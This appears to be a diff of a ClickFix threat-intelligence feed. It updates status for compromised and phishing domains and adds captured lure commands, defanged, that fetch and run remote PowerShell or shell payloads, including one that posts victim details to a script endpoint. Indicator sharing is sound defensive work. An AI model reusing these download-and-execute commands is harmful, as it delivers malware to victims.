@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 4995,
+ "count": 4993,
  "indicators": [
   {
    "indicator": "100porcentopiaui.com.br",
@@ -1128,11 +1128,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
+    "trek-72.com",
     "t-trustrest.com",
-    "trek-72.com"
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -7812,11 +7813,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-24",
    "last_seen": "2026-10-25",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://a-head.fr/",
    "brand": null,
    "product": null,
@@ -7838,7 +7839,7 @@
    "hosts": [
     {
      "host": "a-head.fr",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-24",
      "last_seen": "2026-10-25"
     }
@@ -12243,6 +12244,7 @@
     "interseq.at",
     "nikogdatakonebilo.cc",
     "efreitorher.org",
+    "yaebalciganovvjopu.org",
     "yaebaltakuyusety.com",
     "ciganshina.org"
    ]
@@ -18399,11 +18401,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-17",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://ambulance-bethelem.com/",
    "brand": null,
    "product": null,
@@ -18432,7 +18434,7 @@
    "hosts": [
     {
      "host": "ambulance-bethelem.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-17",
      "last_seen": "2026-11-03"
     }
@@ -21093,11 +21095,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-29",
    "last_seen": "2026-10-31",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://www.anti-gravity.com/",
    "brand": null,
    "product": null,
@@ -21119,7 +21121,7 @@
    "hosts": [
     {
      "host": "www.anti-gravity.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-29",
      "last_seen": "2026-10-31"
     }
@@ -23048,6 +23050,58 @@
    ]
   },
   {
+   "indicator": "aram-tillas.free.nf",
+   "type": "domain",
+   "category": "clickfix",
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-03",
+   "last_seen": "2026-11-03",
+   "last_online": "2026-11-03",
+   "offline_since": null,
+   "url": "https://aram-tillas.free.nf/",
+   "brand": null,
+   "product": null,
+   "hosting": "AS Wildcard UK Limited",
+   "dns": "infinityfree.com",
+   "ip": "185.27.134.224",
+   "asn": "AS34119",
+   "org": "WILDCARD-AS Wildcard UK Limited, GB",
+   "country": "GB",
+   "ips": [
+    {
+     "ip": "185.27.134.224",
+     "asn": "AS34119",
+     "org": "WILDCARD-AS Wildcard UK Limited, GB",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "aram-tillas.free.nf",
+     "status": "online",
+     "first_seen": "2026-11-03",
+     "last_seen": "2026-11-03"
+    }
+   ],
+   "actor": "dprk",
+   "actor_link": "linked",
+   "commands": [
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=83beefde-f033-4104-ac3a-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Faram-tillas.free.nf%2F%3Fi%3D2\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-03T22%3A42%3A07.981Z\"\" -d \"\"lastShellAt=2026-11-03T22%3A42%3A07.981Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
+    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex"
+   ],
+   "connects_to": [
+    "fingerprint-veri.info",
+    "lepafonso.bz"
+   ],
+   "lure_from": [
+    "ncheck-brows.beer"
+   ]
+  },
+  {
    "indicator": "aramohanian.com",
    "type": "domain",
    "category": "clickfix",
@@ -23205,11 +23259,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-20",
    "last_seen": "2026-10-20",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://arbetcons.com/",
    "brand": null,
    "product": null,
@@ -23231,7 +23285,7 @@
    "hosts": [
     {
      "host": "arbetcons.com",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-20",
      "last_seen": "2026-10-20"
     }
@@ -26559,11 +26613,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-28",
    "last_seen": "2026-10-28",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://association-mirabelle.com/",
    "brand": null,
    "product": null,
@@ -26585,7 +26639,7 @@
    "hosts": [
     {
      "host": "association-mirabelle.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-28",
      "last_seen": "2026-10-28"
     }
@@ -33671,11 +33725,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-31",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://beau-port.co.uk/",
    "brand": null,
    "product": null,
@@ -33704,7 +33758,7 @@
    "hosts": [
     {
      "host": "beau-port.co.uk",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-31",
      "last_seen": "2026-11-03"
     }
@@ -40927,11 +40981,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-11-02",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://bluemadmonkey.fr/",
    "brand": null,
    "product": null,
@@ -40953,7 +41007,7 @@
    "hosts": [
     {
      "host": "bluemadmonkey.fr",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-11-02",
      "last_seen": "2026-11-03"
     }
@@ -42491,11 +42545,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-31",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://bookalookalike.co.uk/",
    "brand": null,
    "product": null,
@@ -42545,7 +42599,7 @@
    "hosts": [
     {
      "host": "bookalookalike.co.uk",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-31",
      "last_seen": "2026-11-03"
     }
@@ -47504,11 +47558,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-28",
    "last_seen": "2026-10-29",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://cabinet-hypnose41.fr/",
    "brand": null,
    "product": null,
@@ -47530,7 +47584,7 @@
    "hosts": [
     {
      "host": "cabinet-hypnose41.fr",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-28",
      "last_seen": "2026-10-29"
     }
@@ -49904,11 +49958,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-19",
    "last_seen": "2026-10-20",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://carineorhema.com/",
    "brand": null,
    "product": null,
@@ -49930,7 +49984,7 @@
    "hosts": [
     {
      "host": "carineorhema.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-19",
      "last_seen": "2026-10-20"
     }
@@ -50801,11 +50855,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-11-02",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://casadiromapizza.fr/",
    "brand": null,
    "product": null,
@@ -50827,7 +50881,7 @@
    "hosts": [
     {
      "host": "casadiromapizza.fr",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-11-02",
      "last_seen": "2026-11-03"
     }
@@ -53213,11 +53267,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-26",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://centralnj-pestcontrol.com/",
    "brand": null,
    "product": null,
@@ -53239,7 +53293,7 @@
    "hosts": [
     {
      "host": "centralnj-pestcontrol.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-26",
      "last_seen": "2026-11-03"
     }
@@ -58297,11 +58351,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-31",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://clothes4work.co.uk/",
    "brand": null,
    "product": null,
@@ -58337,7 +58391,7 @@
    "hosts": [
     {
      "host": "clothes4work.co.uk",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-31",
      "last_seen": "2026-11-03"
     }
@@ -61988,11 +62042,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-11-02",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://www.contpercontabil.com.br/",
    "brand": null,
    "product": null,
@@ -62021,7 +62075,7 @@
    "hosts": [
     {
      "host": "www.contpercontabil.com.br",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-11-02",
      "last_seen": "2026-11-03"
     }
@@ -62598,11 +62652,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-20",
    "last_seen": "2026-10-20",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://corazonesabios.com/",
    "brand": null,
    "product": null,
@@ -62624,7 +62678,7 @@
    "hosts": [
     {
      "host": "corazonesabios.com",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-20",
      "last_seen": "2026-10-20"
     }
@@ -64320,11 +64374,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-17",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://cristaldata.info/",
    "brand": null,
    "product": null,
@@ -64353,7 +64407,7 @@
    "hosts": [
     {
      "host": "cristaldata.info",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-17",
      "last_seen": "2026-11-03"
     }
@@ -66321,11 +66375,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-30",
    "last_seen": "2026-10-31",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://cyclingdad.me/",
    "brand": null,
    "product": null,
@@ -66347,7 +66401,7 @@
    "hosts": [
     {
      "host": "cyclingdad.me",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-30",
      "last_seen": "2026-10-31"
     }
@@ -74818,7 +74872,7 @@
     },
     {
      "host": "www.dottoressagiusivillirillo.it",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-26",
      "last_seen": "2026-11-03"
     }
@@ -76485,11 +76539,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-29",
    "last_seen": "2026-10-29",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://drsnpanda.in/",
    "brand": null,
    "product": null,
@@ -76511,7 +76565,7 @@
    "hosts": [
     {
      "host": "drsnpanda.in",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-29",
      "last_seen": "2026-10-29"
     }
@@ -78593,7 +78647,8 @@
     "t-trustrest.com",
     "xorados.com",
     "trek-72.com",
-    "hagosuro.lc"
+    "hagosuro.lc",
+    "neebyishaka.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -78841,11 +78896,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-20",
    "last_seen": "2026-10-20",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://ebayiptv.com/",
    "brand": null,
    "product": null,
@@ -78867,7 +78922,7 @@
    "hosts": [
     {
      "host": "ebayiptv.com",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-20",
      "last_seen": "2026-10-20"
     }
@@ -82711,11 +82766,12 @@
     "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
-    "t-trustrest.com",
     "xorados.com",
+    "t-trustrest.com",
     "hagosuro.lc",
     "trek-72.com",
-    "groverudder12.com"
+    "groverudder12.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -90638,11 +90694,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-30",
    "last_seen": "2026-10-31",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://feni24x7.com/",
    "brand": null,
    "product": null,
@@ -90671,7 +90727,7 @@
    "hosts": [
     {
      "host": "feni24x7.com",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-30",
      "last_seen": "2026-10-31"
     }
@@ -93592,6 +93648,7 @@
     "trek-72.com",
     "code.nvc-info.beer",
     "jscdncloude.beer",
+    "trustchecknes.com",
     "cloud-browse.codes"
    ],
    "lure_from": [
@@ -94654,11 +94711,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-29",
    "last_seen": "2026-10-29",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://fotobella.eu/",
    "brand": null,
    "product": null,
@@ -94680,7 +94737,7 @@
    "hosts": [
     {
      "host": "fotobella.eu",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-29",
      "last_seen": "2026-10-29"
     }
@@ -95095,11 +95152,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-11-01",
    "last_seen": "2026-11-01",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://www.francevictimesdordogne.fr/",
    "brand": null,
    "product": null,
@@ -95121,7 +95178,7 @@
    "hosts": [
     {
      "host": "www.francevictimesdordogne.fr",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-11-01",
      "last_seen": "2026-11-01"
     }
@@ -96517,11 +96574,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-29",
    "last_seen": "2026-10-29",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://ftms-concept.com/",
    "brand": null,
    "product": null,
@@ -96543,7 +96600,7 @@
    "hosts": [
     {
      "host": "ftms-concept.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-29",
      "last_seen": "2026-10-29"
     }
@@ -105731,11 +105788,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-11-01",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://www.graficheconti.it/",
    "brand": null,
    "product": null,
@@ -105757,7 +105814,7 @@
    "hosts": [
     {
      "host": "www.graficheconti.it",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-11-01",
      "last_seen": "2026-11-03"
     }
@@ -110290,11 +110347,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-26",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://hardcontrol.ru/",
    "brand": null,
    "product": null,
@@ -110316,7 +110373,7 @@
    "hosts": [
     {
      "host": "hardcontrol.ru",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-26",
      "last_seen": "2026-11-03"
     }
@@ -126021,11 +126078,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-21",
    "last_seen": "2026-10-22",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://valab.iti.gr/",
    "brand": null,
    "product": null,
@@ -126047,7 +126104,7 @@
    "hosts": [
     {
      "host": "valab.iti.gr",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-21",
      "last_seen": "2026-10-22"
     }
@@ -129553,11 +129610,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-11-01",
    "last_seen": "2026-11-02",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://jendelamedia.com/",
    "brand": null,
    "product": null,
@@ -129579,7 +129636,7 @@
    "hosts": [
     {
      "host": "jendelamedia.com",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-11-01",
      "last_seen": "2026-11-02"
     }
@@ -135164,11 +135221,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-28",
    "last_seen": "2026-10-30",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://bbppmpvbmti.kemendikdasmen.go.id/Ppid/[redacted]/",
    "brand": null,
    "product": null,
@@ -135190,7 +135247,7 @@
    "hosts": [
     {
      "host": "bbppmpvbmti.kemendikdasmen.go.id",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-28",
      "last_seen": "2026-10-30"
     }
@@ -137376,11 +137433,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-25",
    "last_seen": "2026-10-25",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://kkeagle.food/",
    "brand": null,
    "product": null,
@@ -137402,7 +137459,7 @@
    "hosts": [
     {
      "host": "kkeagle.food",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-25",
      "last_seen": "2026-10-25"
     }
@@ -138723,11 +138780,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
+    "trek-72.com",
     "t-trustrest.com",
-    "trek-72.com"
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -139893,11 +139951,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-11-02",
    "last_seen": "2026-11-02",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://kubet88.bid/",
    "brand": null,
    "product": null,
@@ -139919,7 +139977,7 @@
    "hosts": [
     {
      "host": "kubet88.bid",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-11-02",
      "last_seen": "2026-11-02"
     }
@@ -139943,11 +140001,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-31",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://kubet88.fun/",
    "brand": null,
    "product": null,
@@ -139983,7 +140041,7 @@
    "hosts": [
     {
      "host": "kubet88.fun",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-31",
      "last_seen": "2026-11-03"
     }
@@ -140007,11 +140065,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-31",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://kubet88.sh/",
    "brand": null,
    "product": null,
@@ -140047,7 +140105,7 @@
    "hosts": [
     {
      "host": "kubet88.sh",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-31",
      "last_seen": "2026-11-03"
     }
@@ -141025,15 +141083,16 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex",
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
    ],
    "connects_to": [
-    "t-trustrest.com",
     "xorados.com",
     "trek-72.com",
+    "t-trustrest.com",
     "lepafonso.bz",
-    "hagosuro.lc"
+    "hagosuro.lc",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -141840,11 +141899,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-21",
    "last_seen": "2026-10-25",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://www.laventaderepuestos.com/",
    "brand": "Meta",
    "product": "WhatsApp",
@@ -141866,7 +141925,7 @@
    "hosts": [
     {
      "host": "www.laventaderepuestos.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-21",
      "last_seen": "2026-10-25"
     }
@@ -145249,11 +145308,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-26",
    "last_seen": "2026-10-30",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://littletreehouseplayschool.co.za/",
    "brand": null,
    "product": null,
@@ -145275,25 +145334,25 @@
    "hosts": [
     {
      "host": "autoconfig.littletreehouseplayschool.co.za",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-26",
      "last_seen": "2026-10-27"
     },
     {
      "host": "littletreehouseplayschool.co.za",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-30",
      "last_seen": "2026-10-30"
     },
     {
      "host": "mail.littletreehouseplayschool.co.za",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-26",
      "last_seen": "2026-10-27"
     },
     {
      "host": "www.littletreehouseplayschool.co.za",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-26",
      "last_seen": "2026-10-27"
     }
@@ -145624,11 +145683,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-31",
    "last_seen": "2026-10-31",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://localmapcertication.com/",
    "brand": null,
    "product": null,
@@ -145650,7 +145709,7 @@
    "hosts": [
     {
      "host": "localmapcertication.com",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-31",
      "last_seen": "2026-10-31"
     }
@@ -149547,11 +149606,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-29",
    "last_seen": "2026-10-29",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://maison-ecal.com/",
    "brand": null,
    "product": null,
@@ -149573,7 +149632,7 @@
    "hosts": [
     {
      "host": "maison-ecal.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-29",
      "last_seen": "2026-10-29"
     }
@@ -152169,16 +152228,17 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
     "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
     "xorados.com",
     "t-trustrest.com",
-    "groverudder12.com",
     "trek-72.com",
-    "hagosuro.lc"
+    "groverudder12.com",
+    "hagosuro.lc",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -152718,11 +152778,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-30",
    "last_seen": "2026-10-31",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://maryolanieto.com/",
    "brand": null,
    "product": null,
@@ -152744,7 +152804,7 @@
    "hosts": [
     {
      "host": "maryolanieto.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-30",
      "last_seen": "2026-10-31"
     }
@@ -158522,11 +158582,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-23",
    "last_seen": "2026-10-23",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://mikolasklir.cz/",
    "brand": null,
    "product": null,
@@ -158548,7 +158608,7 @@
    "hosts": [
     {
      "host": "mikolasklir.cz",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-23",
      "last_seen": "2026-10-23"
     }
@@ -162217,11 +162277,12 @@
    "commands": [
